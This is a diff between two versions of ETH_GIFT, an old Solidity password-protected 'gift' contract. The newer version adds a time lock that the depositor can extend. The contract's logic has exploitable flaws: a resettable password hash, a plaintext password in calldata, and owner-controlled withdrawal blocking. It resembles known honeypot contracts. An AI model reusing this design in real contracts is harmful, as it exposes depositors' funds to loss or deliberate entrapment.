@@ -1,24 +1,18 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract ETH_GIFT at 0xEFBfc3f373c9cc5c0375403177d71Bcc387D3597
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract ETH_GIFT at 0xc6389ef3d79cf17a5d103bd0f06f83cf76b14258
 */
 pragma solidity ^0.4.19;
 
 contract ETH_GIFT
 {
-    function GetGift(bytes pass)
-    external
-    payable
-    {
+    function GetGift(bytes pass) external payable canOpen {
         if(hashPass == keccak256(pass))
         {
             msg.sender.transfer(this.balance);
         }
     }
     
-    function GetGift()
-    public
-    payable
-    {
+    function GetGift() public payable canOpen {
         if(msg.sender==reciver)
         {
             msg.sender.transfer(this.balance);
@@ -26,43 +20,46 @@ contract ETH_GIFT
     }
     
     bytes32 hashPass;
-    
     bool closed = false;
-    
     address sender;
-    
     address reciver;
+    uint giftTime;
  
     function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}
     
-    function SetPass(bytes32 hash)
-    public
-    payable
-    {
+    function Set_eth_gift(bytes32 hash) public payable {
         if( (!closed&&(msg.value > 1 ether)) || hashPass==0x00)
         {
             hashPass = hash;
             sender = msg.sender;
-
+            giftTime = now;
         }
     }
-   
-    function SetReciver(address _reciver)
-    public
-    {
+    
+    function SetGiftTime(uint date) public canOpen {
+        if(msg.sender==sender)
+        {
+            giftTime = date;
+        }
+    }
+    
+    function SetReciver(address _reciver) public {
         if(msg.sender==sender)
         {
             reciver = _reciver;
         }
     }
     
-    function PassHasBeenSet(bytes32 hash)
-    public
-    {
+    function PassHasBeenSet(bytes32 hash) public {
         if(hash==hashPass&&msg.sender==sender)
         {
            closed=true;
         }
+    }
+    
+    modifier canOpen(){
+        if(now>giftTime)_;
+        else return;
     }
     
     function() public payable{}
